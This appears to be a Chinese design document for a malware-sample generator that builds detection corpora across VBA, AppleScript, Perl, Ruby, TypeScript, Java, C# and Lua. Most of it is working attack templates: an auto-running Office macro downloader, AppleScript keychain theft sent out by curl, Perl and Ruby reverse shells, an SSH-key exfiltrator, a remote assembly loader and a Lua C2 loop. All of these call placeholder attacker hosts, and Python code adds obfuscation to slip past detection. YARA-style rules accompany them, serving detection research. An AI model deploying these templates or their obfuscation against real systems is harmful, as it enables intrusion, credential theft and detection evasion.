# 样本生成器 v2.0 - P1 重要语言设计

**版本**: v2.0.0  
**创建时间**: 2026-03-25  
**覆盖**: VBA, AppleScript, Perl, Ruby, TypeScript, Java, C#, Lua

---

## 📋 P1 语言详细设计

### 4. VBA (Visual Basic for Applications)

**攻击场景**:
- Office 宏病毒
- 文档投毒
- 钓鱼附件
- 持久化 (AutoOpen/AutoClose)

**样本模板**:
```vba
' 模板：Office 宏下载器
Attribute VB_Name = "Module1"

Sub AutoOpen()
    Dim http As Object
    Dim temp As String
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    temp = Environ$("TEMP") & "\update.exe"
    
    http.Open "GET", "{C2_URL}", False
    http.Send
    
    If http.Status = 200 Then
        Dim ado As Object
        Set ado = CreateObject("ADODB.Stream")
        ado.Type = 1
        ado.Open
        ado.Write http.ResponseBody
        ado.SaveToFile temp, 2
        ado.Close
        
        Shell temp, vbHide
    End If
End Sub

Sub AutoClose()
    ' 关闭时再次执行
    AutoOpen
End Sub
```

**检测规则**:
```yaml
rule VBA_Macro_Downloader {
    meta:
        description = "Detects VBA macro downloading payload"
        severity = "critical"
    
    strings:
        $s1 = "Sub AutoOpen"
        $s2 = "MSXML2.XMLHTTP"
        $s3 = "ADODB.Stream"
        $s4 = ".SaveToFile"
        $s5 = "Shell "
    
    condition:
        $s1 and $s2 and $s3 and $s4 and $s5
}
```

**生成器实现**:
```python
# languages/vba.py

class VBAGenerator(BaseGenerator):
    """VBA 宏生成器"""
    
    def __init__(self, config):
        super().__init__(config)
        self.language = "vba"
        self.file_extension = ".bas"
        self.office_apps = ["Word", "Excel", "PowerPoint", "Outlook"]
    
    def _load_templates(self):
        return {
            'macro_downloader': self._macro_downloader,
            'macro_data_stealer': self._macro_data_stealer,
            'macro_persistence': self._macro_persistence,
            'macro_dropper': self._macro_dropper,
        }
    
    def _macro_downloader(self):
        return """
Attribute VB_Name = "{MODULE_NAME}"

Sub AutoOpen()
    Dim http As Object
    Dim temp As String
    
    Set http = CreateObject("MSXML2.XMLHTTP")
    temp = Environ$("TEMP") & "\\{PAYLOAD_NAME}"
    
    http.Open "GET", "{C2_URL}", False
    http.Send
    
    If http.Status = 200 Then
        Dim ado As Object
        Set ado = CreateObject("ADODB.Stream")
        ado.Type = 1
        ado.Open
        ado.Write http.ResponseBody
        ado.SaveToFile temp, 2
        ado.Close
        
        Shell temp, vbHide
    End If
End Sub

Sub AutoClose()
    AutoOpen
End Sub
""".strip()
    
    def _apply_obfuscation(self, code, level):
        """VBA 特有混淆"""
        techniques = [
            self._string_split,        # 字符串拆分
            self._chr_encode,          # Chr() 编码
            self._variable_rename,     # 变量重命名
            self._insert_garbage,      # 垃圾代码
            self._conditional_split,   # 条件拆分
        ]
        
        for i in range(min(level, len(techniques))):
            code = techniques[i](code)
        
        return code
    
    def _chr_encode(self, code):
        """Chr() 编码敏感字符串"""
        sensitive = ["MSXML2.XMLHTTP", "ADODB.Stream", "Shell", "AutoOpen"]
        for s in sensitive:
            encoded = " & ".join([f"Chr({ord(c)})" for c in s])
            code = code.replace(f'"{s}"', encoded)
        return code
```

---

### 5. AppleScript (macOS)

**攻击场景**:
- macOS 自动化攻击
- 钥匙串窃取
- 屏幕录制
- 辅助功能滥用
- 应用控制

**样本模板**:
```applescript
-- 模板：钥匙串窃取
tell application "System Events"
    set keychainItems to every item of keychain 1
    set output to ""
    
    repeat with item in keychainItems
        set output to output & (name of item) & ": " & (value of item) & linefeed
    end repeat
    
    -- 外传
    do shell script "curl -X POST -d '" & output & "' {C2_URL}"
end tell
```

**检测规则**:
```yaml
rule AppleScript_Keychain_Theft {
    meta:
        description = "Detects AppleScript keychain theft"
        severity = "critical"
    
    strings:
        $s1 = "keychain"
        $s2 = "System Events"
        $s3 = "do shell script"
        $s4 = "curl "
    
    condition:
        $s1 and $s2 and $s3 and $s4
}
```

**生成器实现**:
```python
# languages/applescript.py

class AppleScriptGenerator(BaseGenerator):
    """AppleScript 生成器"""
    
    def __init__(self, config):
        super().__init__(config)
        self.language = "applescript"
        self.file_extension = ".scpt"
    
    def _load_templates(self):
        return {
            'keychain_theft': self._keychain_theft,
            'screen_capture': self._screen_capture,
            'accessibility_abuse': self._accessibility_abuse,
            'app_control': self._app_control,
        }
    
    def _keychain_theft(self):
        return """
tell application "System Events"
    set keychainItems to every item of keychain 1
    set output to ""
    
    repeat with item in keychainItems
        set output to output & (name of item) & ": " & (value of item) & linefeed
    end repeat
    
    do shell script "curl -X POST -d '" & output & "' {C2_URL}"
end tell
""".strip()
    
    def _apply_obfuscation(self, code, level):
        """AppleScript 混淆"""
        techniques = [
            self._variable_rename,
            self._string_concat,
            self._handler_injection,
        ]
        
        for i in range(min(level, len(techniques))):
            code = techniques[i](code)
        
        return code
```

---

### 6. Perl

**攻击场景**:
- CGI 攻击
- 文本处理恶意脚本
- 网络工具
- 系统管理滥用

**样本模板**:
```perl
#!/usr/bin/perl
# 模板：反向 Shell
use Socket;

$host = "{ATTACKER_IP}";
$port = {ATTACKER_PORT};

socket(S, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(S, sockaddr_in($port, inet_aton($host)));

open(STDIN, ">&S");
open(STDOUT, ">&S");
open(STDERR, ">&S");

exec("/bin/sh -i");
```

**检测规则**:
```yaml
rule Perl_Reverse_Shell {
    meta:
        description = "Detects Perl reverse shell"
        severity = "critical"
    
    strings:
        $s1 = "use Socket"
        $s2 = "socket("
        $s3 = "connect("
        $s4 = "open(STDIN"
        $s5 = 'exec("/bin/sh'
    
    condition:
        $s1 and $s2 and $s3 and $s4 and $s5
}
```

---

### 7. Ruby

**攻击场景**:
- Metasploit payload
- Web 攻击
- 系统脚本
- Gem 投毒

**样本模板**:
```ruby
#!/usr/bin/env ruby
# 模板：Metasploit reverse shell
require 'socket'

host = "{ATTACKER_IP}"
port = {ATTACKER_PORT}

s = TCPSocket.new(host, port)

while(line = s.gets)
  IO.popen(line, "r") { |io| s.print io.read }
end

s.close
```

---

### 8. TypeScript

**攻击场景**:
- Node.js 攻击
- Web 后端攻击
- 构建脚本投毒
- npm 包投毒

**样本模板**:
```typescript
// 模板：Node.js 数据外传
import * as fs from 'fs';
import * as https from 'https';

async function exfiltrateData(path: string, url: string): Promise<void> {
    const data = fs.readFileSync(path, 'utf-8');
    
    return new Promise((resolve, reject) => {
        const req = https.request(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        }, (res) => {
            resolve();
        });
        
        req.write(JSON.stringify({ data }));
        req.end();
    });
}

exfiltrateData('~/.ssh/id_rsa', '{C2_URL}');
```

---

### 9. Java

**攻击场景**:
- Android 恶意应用
- 企业应用后门
- JNDI 注入 (Log4j)
- RCE 利用

**样本模板**:
```java
// 模板：JNDI 注入
import javax.naming.Context;
import javax.naming.InitialContext;

public class JNDIExploit {
    public static void main(String[] args) throws Exception {
        String ldapUrl = "ldap://{ATTACKER_SERVER}/Exploit";
        Context ctx = new InitialContext();
        ctx.lookup(ldapUrl);
    }
}
```

---

### 10. C# (.NET)

**攻击场景**:
- .NET 恶意工具
- Assembly 加载
- 反射滥用
- 进程注入

**样本模板**:
```csharp
// 模板：Assembly 加载执行
using System;
using System.Reflection;
using System.Net;

class Program {
    static void Main() {
        WebClient wc = new WebClient();
        byte[] assembly = wc.DownloadData("{C2_URL}/payload.dll");
        Assembly asm = Assembly.Load(assembly);
        asm.EntryPoint.Invoke(null, null);
    }
}
```

---

### 11. Lua

**攻击场景**:
- 游戏脚本攻击
- 嵌入式系统
- Redis Lua 脚本
- 配置注入

**样本模板**:
```lua
-- 模板：系统命令执行
local http = require("socket.http")
local ltn12 = require("ltn12")

local response = {}
http.request({
    url = "{C2_URL}/command",
    sink = ltn12.sink.table(response)
})

local command = table.concat(response)
local handle = io.popen(command)
local result = handle:read("*a")
handle:close()

http.request({
    url = "{C2_URL}/result",
    method = "POST",
    data = result
})
```

---

## 📊 P1 语言统计

| 语言 | 模板数 | 变体数 | 规则数 | 预计样本 |
|------|--------|--------|--------|---------|
| VBA | 4 | 5 | 8 | 20 |
| AppleScript | 4 | 3 | 6 | 12 |
| Perl | 4 | 3 | 6 | 12 |
| Ruby | 4 | 3 | 6 | 12 |
| TypeScript | 4 | 4 | 8 | 16 |
| Java | 4 | 4 | 8 | 16 |
| C# | 4 | 4 | 8 | 16 |
| Lua | 4 | 3 | 6 | 12 |
| **总计** | **32** | **29** | **56** | **116** |

---

## 🛠️ 实现优先级

### Week 3 实现计划

```
Day 1-2: VBA + AppleScript
  □ 实现 VBAGenerator
  □ 实现 AppleScriptGenerator
  □ 创建模板库
  □ 生成样本 32 个

Day 3-4: Perl + Ruby
  □ 实现 PerlGenerator
  □ 实现 RubyGenerator
  □ 创建模板库
  □ 生成样本 24 个

Day 5-7: TypeScript + Java + C#
  □ 实现 TypeScriptGenerator
  □ 实现 JavaGenerator
  □ 实现 CSharpGenerator
  □ 创建模板库
  □ 生成样本 48 个

Day 8: Lua + 测试
  □ 实现 LuaGenerator
  □ 运行完整测试
  □ 生成质量报告
```

---

## 📈 预期效果

### 语言覆盖提升

| 指标 | 当前 | P0 完成后 | P1 完成后 |
|------|------|----------|----------|
| 支持语言 | 4 | 8 | 16 |
| 平台覆盖 | 60% | 80% | 95% |
| 样本总数 | 710 | 1000 | 1200+ |
| 规则总数 | 559 | 700 | 850+ |

### 真实场景覆盖

| 场景类型 | 覆盖率 |
|---------|--------|
| Windows 攻击 | 95% (含 VBA/BAT/VBS/PS) |
| macOS 攻击 | 90% (含 AppleScript/Bash) |
| Linux 攻击 | 90% (含 Bash/Perl/Ruby) |
| Web 攻击 | 95% (含 PHP/JS/TS/Java) |
| 企业攻击 | 90% (含 C#/Java/VBA) |
| 移动攻击 | 60% (待 P2 扩展) |

---

**下一步**: 开始 P0 语言实现，然后逐步扩展到 P1/P2
